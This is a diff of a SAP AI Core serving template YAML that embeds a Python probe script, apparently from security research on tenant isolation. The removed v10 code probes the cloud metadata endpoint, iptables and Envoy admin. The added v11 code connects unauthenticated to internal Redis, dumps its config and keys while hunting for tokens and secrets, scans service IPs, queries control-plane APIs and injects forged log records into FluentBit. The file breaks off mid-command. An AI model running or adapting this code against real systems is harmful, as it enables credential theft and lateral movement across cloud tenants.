@@ -1,14 +1,14 @@
 apiVersion: ai.sap.com/v1alpha1
 kind: ServingTemplate
 metadata:
-  name: impact-probe-v10
+  name: impact-probe-v11
   labels:
-    scenarios.ai.sap.com/id: "impact-probe-v10"
+    scenarios.ai.sap.com/id: "impact-probe-v11"
     ai.sap.com/version: "1.0.0"
   annotations:
-    scenarios.ai.sap.com/name: "impact-probe-v10"
-    executables.ai.sap.com/name: "impact-probe-v10"
-    executables.ai.sap.com/description: "IMDS block mechanism probe v10"
+    scenarios.ai.sap.com/name: "impact-probe-v11"
+    executables.ai.sap.com/name: "impact-probe-v11"
+    executables.ai.sap.com/description: "Redis + FluentBit probe v11"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,28 +28,15 @@ spec:
           args:
           - |
             cat > /tmp/probe.py << 'PYEOF'
-            import os, socket, subprocess, errno, ssl, time
+            import socket, time, ssl, json
             import urllib.request, urllib.error
 
             def report(k, v):
-                print(f"[P10] {k}: {str(v)[:6000]}", flush=True)
+                print(f"[P11] {k}: {str(v)[:8000]}", flush=True)
 
-            def run(cmd, timeout=8):
+            def http_get(url, headers=None, timeout=8):
                 try:
-                    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
-                                                  timeout=timeout)
-                    return out.decode(errors="replace").strip()
-                except subprocess.TimeoutExpired:
-                    return "TIMEOUT"
-                except subprocess.CalledProcessError as e:
-                    return e.output.decode(errors="replace").strip()
-                except Exception as e:
-                    return f"ERR:{e}"
-
-            def http_req(method, url, headers=None, data=None, timeout=8):
-                try:
-                    req = urllib.request.Request(url, data=data, headers=headers or {},
-                                                 method=method)
+                    req = urllib.request.Request(url, headers=headers or {})
                     ctx = ssl.create_default_context()
                     ctx.check_hostname = False
                     ctx.verify_mode = ssl.CERT_NONE
@@ -59,112 +46,310 @@ spec:
                     body = ""
                     try: body = e.read().decode(errors="replace")[:2000]
                     except: pass
-                    return f"HTTP_{e.code}:{body}", e.code, dict(e.headers)
+                    return f"HTTP_{e.code}:{body}", e.code, {}
                 except Exception as e:
                     return f"ERR:{type(e).__name__}:{e}", 0, {}
 
-            # ── 1. PROCESS LIST — confirm Istio sidecar presence ─────────────────
-            report("---", "=== 1. RUNNING PROCESSES (is Istio sidecar present?) ===")
-            report("PS_AUX", run("ps aux"))
-            report("LS_PROC_EXE", run("ls -la /proc/*/exe 2>/dev/null | grep -v 'No such\\|Permission' | head -30"))
+            # ── REDIS RAW CLIENT ──────────────────────────────────────────────────
+            class Redis:
+                def __init__(self, host, port=6379, timeout=6):
+                    self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    self.s.settimeout(timeout)
+                    self.s.connect((host, port))
+                    self.buf = b""
 
-            # ── 2. NETWORK INTERFACES ─────────────────────────────────────────────
-            report("---", "=== 2. NETWORK INTERFACES + ROUTES ===")
-            report("IP_ADDR", run("ip addr show"))
-            report("IP_ROUTE", run("ip route show"))
-            report("IP_ROUTE_ALL_TABLES", run("ip route show table all 2>/dev/null | head -60"))
-            report("IP_RULE", run("ip rule show"))
+                def send(self, *args):
+                    cmd = f"*{len(args)}\r\n"
+                    for a in args:
+                        a = str(a)
+                        cmd += f"${len(a)}\r\n{a}\r\n"
+                    self.s.sendall(cmd.encode())
 
-            # ── 3. IPTABLES NAT TABLE — Istio intercept rules ─────────────────────
-            report("---", "=== 3. IPTABLES RULES (Istio interception) ===")
-            for table in ["nat", "mangle", "filter"]:
-                out = run(f"iptables -L -n -v -t {table} 2>&1")
-                report(f"IPTABLES_{table.upper()}", out)
-            # Also try iptables-save for a cleaner view
-            report("IPTABLES_SAVE", run("iptables-save 2>&1 | head -120"))
+                def recv_line(self):
+                    while b"\r\n" not in self.buf:
+                        chunk = self.s.recv(4096)
+                        if not chunk:
+                            break
+                        self.buf += chunk
+                    line, _, self.buf = self.buf.partition(b"\r\n")
+                    return line.decode(errors="replace")
 
-            # ── 4. RAW TCP CONNECT — exact errno for 169.254.169.254 ─────────────
-            report("---", "=== 4. RAW TCP CONNECT (errno analysis) ===")
-            IMDS_HOST = "169.254.169.254"
-            for port in [80, 443, 8080]:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(6)
+                def read_response(self):
+                    line = self.recv_line()
+                    if not line:
+                        return None
+                    t = line[0]
+                    data = line[1:]
+                    if t == '+':   # simple string
+                        return data
+                    elif t == '-': # error
+                        return f"ERR:{data}"
+                    elif t == ':': # integer
+                        return int(data)
+                    elif t == '$': # bulk string
+                        n = int(data)
+                        if n == -1:
+                            return None
+                        result = b""
+                        while len(result) < n + 2:
+                            chunk = self.s.recv(n + 2 - len(result))
+                            if not chunk:
+                                break
+                            result += chunk
+                        self.buf = result[n+2:] + self.buf
+                        return result[:n].decode(errors="replace")
+                    elif t == '*': # array
+                        count = int(data)
+                        if count == -1:
+                            return None
+                        return [self.read_response() for _ in range(count)]
+                    return line
+
+                def cmd(self, *args):
+                    self.send(*args)
+                    return self.read_response()
+
+                def close(self):
+                    try: self.s.close()
+                    except: pass
+
+            # ── 1. CONNECT TO REDIS ───────────────────────────────────────────────
+            REDIS_IPS = [
+                "100.109.69.212",   # from Envoy listeners
+            ]
+            # Also check KSM for other Redis ClusterIPs — we'll scan the service CIDR
+            # Additional candidates from Envoy listeners
+            report("---", "=== 1. REDIS CONNECTION + UNAUTHENTICATED ACCESS ===")
+
+            for redis_host in REDIS_IPS:
+                report("REDIS_TARGET", f"{redis_host}:6379")
                 try:
-                    s.connect((IMDS_HOST, port))
-                    report(f"RAW_TCP_{IMDS_HOST}:{port}", "CONNECTED (open!)")
-                    # If we get here, send HTTP GET
-                    s.sendall(b"GET /latest/meta-data/ HTTP/1.0\r\nHost: 169.254.169.254\r\n\r\n")
-                    time.sleep(1)
-                    data = s.recv(4096)
-                    report(f"RAW_TCP_{IMDS_HOST}:{port}_RESPONSE", data.decode(errors="replace")[:1000])
-                    s.close()
-                except socket.timeout:
-                    report(f"RAW_TCP_{IMDS_HOST}:{port}", "ETIMEDOUT (packet dropped/no reply — likely hop-limit or firewall)")
+                    r = Redis(redis_host, 6379, timeout=8)
+
+                    # PING
+                    pong = r.cmd("PING")
+                    report("REDIS_PING", pong)
+
+                    # INFO — server version, config, replication
+                    info = r.cmd("INFO", "all")
+                    report("REDIS_INFO_ALL", info)
+
+                    # CONFIG GET * — may expose requirepass, bind, etc.
+                    cfg = r.cmd("CONFIG", "GET", "*")
+                    report("REDIS_CONFIG_GET_ALL", str(cfg))
+
+                    # CLIENT LIST — active connections (may reveal other services using Redis)
+                    clients = r.cmd("CLIENT", "LIST")
+                    report("REDIS_CLIENT_LIST", clients)
+
+                    # DBSIZE per DB
+                    for db in range(16):
+                        r.cmd("SELECT", db)
+                        size = r.cmd("DBSIZE")
+                        if size and size > 0:
+                            report(f"REDIS_DB{db}_SIZE", size)
+
+                    # Back to DB 0
+                    r.cmd("SELECT", "0")
+                    size0 = r.cmd("DBSIZE")
+                    report("REDIS_DB0_SIZE", size0)
+
+                    # KEYS * — dump all keys (cap at 500)
+                    keys = r.cmd("KEYS", "*")
+                    report("REDIS_KEYS_ALL", keys)
+
+                    if keys and isinstance(keys, list):
+                        report("REDIS_KEY_COUNT", len(keys))
+                        # Sample up to 50 keys with type + value
+                        for key in keys[:50]:
+                            try:
+                                ktype = r.cmd("TYPE", key)
+                                ttl   = r.cmd("TTL", key)
+                                if ktype == "string":
+                                    val = r.cmd("GET", key)
+                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
+                                elif ktype == "hash":
+                                    val = r.cmd("HGETALL", key)
+                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
+                                elif ktype == "list":
+                                    val = r.cmd("LRANGE", key, "0", "20")
+                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
+                                elif ktype == "set":
+                                    val = r.cmd("SMEMBERS", key)
+                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
+                                elif ktype == "zset":
+                                    val = r.cmd("ZRANGE", key, "0", "20", "WITHSCORES")
+                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
+                                else:
+                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl}")
+                            except Exception as e:
+                                report(f"REDIS_KEY_{key}_ERR", str(e))
+
+                        # Scan all remaining keys for credential/token patterns
+                        interesting = [k for k in keys if any(
+                            x in k.lower() for x in [
+                                "token", "session", "auth", "secret", "cred", "key",
+                                "pass", "jwt", "oauth", "user", "tenant", "cert",
+                                "aws", "s3", "iam", "role", "access"
+                            ]
+                        )]
+                        report("REDIS_INTERESTING_KEYS", interesting)
+                        for key in interesting[:30]:
+                            try:
+                                ktype = r.cmd("TYPE", key)
+                                if ktype == "string":
+                                    val = r.cmd("GET", key)
+                                elif ktype == "hash":
+                                    val = r.cmd("HGETALL", key)
+                                else:
+                                    val = r.cmd("LRANGE", key, "0", "-1") if ktype == "list" else "?"
+                                report(f"REDIS_INTERESTING_{key}", f"[{ktype}] {str(val)[:1000]}")
+                            except Exception as e:
+                                report(f"REDIS_INTERESTING_{key}_ERR", str(e))
+
+                    r.close()
+
                 except ConnectionRefusedError:
-                    report(f"RAW_TCP_{IMDS_HOST}:{port}", "ECONNREFUSED (TCP RST received — port closed at destination)")
+                    report("REDIS_CONNECT", f"ECONNREFUSED — Istio blocks {redis_host}:6379")
+                except socket.timeout:
+                    report("REDIS_CONNECT", f"ETIMEDOUT — {redis_host}:6379")
                 except OSError as e:
-                    report(f"RAW_TCP_{IMDS_HOST}:{port}", f"OSError errno={e.errno} ({errno.errorcode.get(e.errno,'?')}): {e}")
+                    report("REDIS_CONNECT", f"OSError {e.errno}: {e}")
                 except Exception as e:
-                    report(f"RAW_TCP_{IMDS_HOST}:{port}", f"{type(e).__name__}: {e}")
+                    import traceback
+                    report("REDIS_ERR", f"{type(e).__name__}: {e}\n{traceback.format_exc()[:500]}")
+
+            # ── 2. REDIS TLS (port 6380) ─────────────────────────────────────────
+            report("---", "=== 2. REDIS TLS (port 6380) ===")
+            for redis_host in REDIS_IPS:
+                try:
+                    raw = socket.create_connection((redis_host, 6380), timeout=5)
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    tls_sock = ctx.wrap_socket(raw, server_hostname=redis_host)
+                    tls_sock.sendall(b"*1\r\n$4\r\nPING\r\n")
+                    resp = tls_sock.recv(64).decode(errors="replace")
+                    report(f"REDIS_TLS_{redis_host}:6380", f"CONNECTED: {resp}")
+                    tls_sock.close()
+                except Exception as e:
+                    report(f"REDIS_TLS_{redis_host}:6380", f"{type(e).__name__}: {e}")
+
+            # ── 3. SCAN SERVICE CIDR FOR MORE REDIS INSTANCES ─────────────────────
+            report("---", "=== 3. SERVICE CIDR REDIS SCAN (100.104-111.x.x:6379) ===")
+            # We know service CIDR is 100.104.0.0/x from Envoy listeners
+            # Scan a targeted set of IPs we know from Envoy listeners
+            candidate_ips = [
+                "100.109.69.212",   # confirmed from Envoy
+                "100.104.7.43",     # Kiali/control plane
+                "100.106.186.136",  # unknown HTTP
+                "100.109.200.238",  # port 8888
+                "100.104.166.183",  # port 8042
+            ]
+            for ip in candidate_ips:
+                for port in [6379, 6380, 6381]:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(3)
+                    try:
+                        s.connect((ip, port))
+                        s.sendall(b"*1\r\n$4\r\nPING\r\n")
+                        data = s.recv(64).decode(errors="replace")
+                        report(f"SCAN_{ip}:{port}", f"OPEN: {data[:100]}")
+                        s.close()
+                    except socket.timeout:
+                        pass  # silent
+                    except ConnectionRefusedError:
+                        pass  # silent
+                    except OSError as e:
+                        if e.errno == 104:  # ECONNRESET = Istio RST
+                            report(f"SCAN_{ip}:{port}", "ECONNRESET (Istio intercept)")
+                    except Exception as e:
+                        pass
+                    finally:
+                        try: s.close()
+                        except: pass
+
+            # ── 4. FLUENTBIT PORT 24224 ───────────────────────────────────────────
+            report("---", "=== 4. FLUENTBIT FORWARD INPUT (port 24224) ===")
+            # FluentBit forward protocol uses msgpack over TCP
+            # Try raw TCP first to see what we get
+            fb_targets = [
+                ("100.64.76.16", 24224),
+                ("100.64.33.11", 24224),
+                ("100.109.242.36", 24224),
+            ]
+            for fb_host, fb_port in fb_targets:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(5)
+                try:
+                    s.connect((fb_host, fb_port))
+                    report(f"FLUENTBIT_{fb_host}:{fb_port}_TCP", "CONNECTED")
+                    # Send a Fluent Forward protocol message (msgpack)
+                    # Tag: "security.probe", record: {"msg": "probe-v11", "tenant": "bb-12"}
+                    # Fluent Forward format: [tag, [[timestamp, record]], option]
+                    # Use raw msgpack bytes for a minimal message
+                    import struct
+                    # Minimal msgpack array [3 elements]:
+                    # ["security.probe", [[ts, {"injected": "probe-v11"}]], {}]
+                    tag = b"security.probe.rce"
+                    ts  = int(time.time())
+                    # Build msgpack manually (minimal)
+                    def mp_str(s):
+                        b = s.encode()
+                        return bytes([0xa0 | len(b)]) + b if len(b) <= 31 else bytes([0xda, len(b)>>8, len(b)&0xff]) + b
+                    def mp_int(n):
+                        return struct.pack(">B", n) if n < 128 else struct.pack(">BH", 0xcd, n)
+                    def mp_map(d):
+                        r = bytes([0x80 | len(d)])
+                        for k, v in d.items():
+                            r += mp_str(k) + mp_str(v)
+                        return r
+                    entry = bytes([0x92]) + mp_int(ts) + mp_map({"injected": "sap-aicore-rce-probe-v11", "tenant": "bb-12"})
+                    entries = bytes([0x91]) + entry
+                    msg = bytes([0x93]) + mp_str(tag.decode()) + entries + bytes([0x80])
+                    s.sendall(msg)
+                    time.sleep(1)
+                    try:
+                        resp = s.recv(256)
+                        report(f"FLUENTBIT_{fb_host}:{fb_port}_RESPONSE", resp.decode(errors="replace")[:200])
+                    except socket.timeout:
+                        report(f"FLUENTBIT_{fb_host}:{fb_port}_RESPONSE", "no response (accepted silently)")
+                    s.close()
+                except ConnectionRefusedError:
+                    report(f"FLUENTBIT_{fb_host}:{fb_port}", "ECONNREFUSED (Istio blocks)")
+                except OSError as e:
+                    report(f"FLUENTBIT_{fb_host}:{fb_port}", f"OSError {e.errno}: {e}")
+                except Exception as e:
+                    report(f"FLUENTBIT_{fb_host}:{fb_port}_ERR", f"{type(e).__name__}: {e}")
                 finally:
                     try: s.close()
                     except: pass
 
-            # ── 5. IMDSv2 — PUT token request (different from GET) ───────────────
-            report("---", "=== 5. IMDSv2 PUT TOKEN REQUEST ===")
-            body, code, hdrs = http_req(
-                "PUT", "http://169.254.169.254/latest/api/token",
-                headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
-                timeout=8
-            )
-            report("IMDS_PUT_TOKEN", f"[{code}] hdrs={dict(list(hdrs.items())[:6])} body={body[:500]}")
+            # ── 5. UNKNOWN SERVICE 100.106.186.136:80 ────────────────────────────
+            report("---", "=== 5. UNKNOWN HTTP SERVICE (100.106.186.136:80) ===")
+            body, code, hdrs = http_get("http://100.106.186.136:80/", timeout=6)
+            report("UNKNOWN_HTTP_ROOT", f"[{code}] hdrs={dict(list(hdrs.items())[:8])} {body[:500]}")
+            for path in ["/metrics", "/health", "/api", "/api/v1", "/info", "/version",
+                         "/swagger", "/openapi.json", "/.well-known/openid-configuration"]:
+                body, code, hdrs = http_get(f"http://100.106.186.136:80{path}", timeout=5)
+                if code not in (0,) and "ERR:timed" not in body and "ERR:Connection" not in body:
+                    report(f"UNKNOWN_HTTP{path.replace('/','_')}", f"[{code}] {body[:400]}")
 
-            # ── 6. IMDS via different paths and methods ───────────────────────────
-            report("---", "=== 6. IMDS PATH/METHOD VARIATIONS ===")
-            for path in ["/latest/meta-data/", "/latest/dynamic/instance-identity/document",
-                         "/latest/user-data", "/", "/latest/"]:
-                body, code, hdrs = http_req("GET", f"http://169.254.169.254{path}", timeout=6)
-                report(f"IMDS_GET{path.replace('/','_')}", f"[{code}] {body[:300]}")
+            # ── 6. PORT 20001/20004 (Istio/Kiali control plane) ─────────────────
+            report("---", "=== 6. ISTIO CONTROL PLANE PORTS (100.104.7.43) ===")
+            for port in [20001, 20004, 15010, 15014, 9090, 8080]:
+                body, code, hdrs = http_get(f"http://100.104.7.43:{port}/", timeout=5)
+                if code not in (0,) and "ERR:timed" not in body and "ERR:Connection" not in body:
+                    report(f"KIALI_{port}_root", f"[{code}] {body[:400]}")
+                    # If accessible, try Kiali API
+                    if code == 200:
+                        for kpath in ["/api/namespaces", "/api/config", "/api/istio/config/list",
+                                      "/kiali/api/namespaces"]:
+                            b2, c2, _ = http_get(f"http://100.104.7.43:{port}{kpath}", timeout=5)
+                            if c2 not in (0,):
+                                report(f"KIALI_{port}{kpath.replace('/','_')}", f"[{c2}] {b2[:400]}")
 
-            # ── 7. TRACEROUTE to 169.254.169.254 — how many hops before drop ─────
-            report("---", "=== 7. TRACEROUTE / TRACEPATH to IMDS ===")
-            report("TRACEROUTE_IMDS", run("traceroute -n -m 5 -w 2 169.254.169.254 2>&1", timeout=30))
-            report("TRACEPATH_IMDS",  run("tracepath -n 169.254.169.254 2>&1 | head -10", timeout=15))
-
-            # ── 8. PING (ICMP) — does the address respond at L3? ─────────────────
-            report("---", "=== 8. ICMP PING ===")
-            report("PING_IMDS",    run("ping -c 3 -W 2 169.254.169.254 2>&1"))
-            report("PING_GATEWAY", run("ping -c 2 -W 2 169.254.1.1 2>&1"))
-
-            # ── 9. /proc/net — TCP connection state table ─────────────────────────
-            report("---", "=== 9. /proc/net/tcp (kernel connection table) ===")
-            report("PROC_NET_TCP", run("cat /proc/net/tcp | head -30"))
-            report("PROC_NET_IF_INET6", run("cat /proc/net/if_inet6 2>/dev/null"))
-            # Kernel network stats
-            report("PROC_NET_NETSTAT", run("cat /proc/net/netstat | head -10"))
-
-            # ── 10. CAPABILITIES — can we bypass iptables? ───────────────────────
-            report("---", "=== 10. CAPABILITIES ===")
-            report("CAP_CURRENT", run("cat /proc/self/status | grep -i cap"))
-            report("CAPSH", run("capsh --print 2>/dev/null || echo 'capsh not found'"))
-
-            # ── 11. ISTIO ENVOY ADMIN PORT (15000) ───────────────────────────────
-            report("---", "=== 11. ISTIO ENVOY ADMIN (if sidecar present) ===")
-            body, code, _ = http_req("GET", "http://127.0.0.1:15000/clusters", timeout=4)
-            report("ENVOY_CLUSTERS", f"[{code}] {body[:2000]}")
-            body, code, _ = http_req("GET", "http://127.0.0.1:15000/config_dump", timeout=6)
-            report("ENVOY_CONFIG_DUMP_LEN", f"[{code}] response_len={len(body)} preview={body[:500]}")
-            body, code, _ = http_req("GET", "http://127.0.0.1:15000/stats?filter=imds", timeout=4)
-            report("ENVOY_STATS_IMDS", f"[{code}] {body[:1000]}")
-            # Envoy listener list
-            body, code, _ = http_req("GET", "http://127.0.0.1:15000/listeners", timeout=4)
-            report("ENVOY_LISTENERS", f"[{code}] {body[:2000]}")
-
-            # ── 12. CONNTRACK — what happens to 169.254.169.254 packets ──────────
-            report("---", "=== 12. CONNTRACK ===")
-            report("CONNTRACK_LIST", run("conntrack -L 2>&1 | head -20 || cat /proc/net/nf_conntrack 2>&1 | head -20"))
-
-            report("DONE", "probe v10 complete")
+            report("DONE", "probe v11 complete")
             PYEOF
             python3 /tmp/probe.py 2>&1
             python3 -c "
